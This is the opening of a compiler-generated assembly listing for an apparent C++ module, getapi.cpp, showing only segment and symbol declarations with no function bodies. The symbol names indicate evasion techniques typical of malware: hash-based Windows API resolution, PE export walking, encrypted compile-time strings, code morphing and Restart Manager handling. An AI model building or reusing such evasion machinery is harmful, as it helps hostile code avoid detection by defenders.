; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?g_hKernel32@@3PEAUHINSTANCE__@@EA		; g_hKernel32
PUBLIC	?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA	; pLoadLibraryA
PUBLIC	?g_ApiCache@@3PEAPEAXEA				; g_ApiCache
PUBLIC	?g_IsRstrtMgrLoaded@@3HA			; g_IsRstrtMgrLoaded
_BSS	SEGMENT
?g_hKernel32@@3PEAUHINSTANCE__@@EA DQ 01H DUP (?)	; g_hKernel32
?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA DQ 01H DUP (?) ; pLoadLibraryA
?g_ApiCache@@3PEAPEAXEA DQ 01H DUP (?)			; g_ApiCache
?g_IsRstrtMgrLoaded@@3HA DD 01H DUP (?)			; g_IsRstrtMgrLoaded
_BSS	ENDS
msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__E91472BE_hash@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__899FCD3C_mrph@h DB 01H
__10B8ABDC_getapi@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	RtlSecureZeroMemory
PUBLIC	?InitializeGetapiModule@getapi@@YAHXZ		; getapi::InitializeGetapiModule
PUBLIC	?IsRestartManagerLoaded@getapi@@YAHXZ		; getapi::IsRestartManagerLoaded
PUBLIC	?SetRestartManagerLoaded@getapi@@YAXH@Z		; getapi::SetRestartManagerLoaded
PUBLIC	?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z	; getapi::GetProcAddressEx
PUBLIC	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z	; getapi::GetProcAddressEx2
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	?morphcode@@YAXH@Z				; morphcode
PUBLIC	?morphcode@@YAXPEAX@Z				; morphcode
PUBLIC	?StrLen@@YAHPEBD@Z				; StrLen
PUBLIC	?StrLen@@YAHPEB_W@Z				; StrLen
PUBLIC	?m_memcpy@@YAXPEAXQEAX_K@Z			; m_memcpy
PUBLIC	?FindChar@@YAPEADPEADD@Z			; FindChar
PUBLIC	?my_stoi@@YAHPEAD@Z				; my_stoi
PUBLIC	?GetForvardedProc@@YAPEAXPEAD@Z			; GetForvardedProc
PUBLIC	?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z ; CheckForForvardedProc
PUBLIC	?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z ; GetFunctionAddresss
PUBLIC	?ReturnAddress@@YAXPEAKK@Z			; ReturnAddress
PUBLIC	?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z ; FindFunction
PUBLIC	?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z	; GetApiAddr
PUBLIC	?GetHashBase@@YAKPEAULDR_MODULE@@@Z		; GetHashBase
PUBLIC	?GetKernel32@@YAPEAUHINSTANCE__@@XZ		; GetKernel32
PUBLIC	??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<29,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
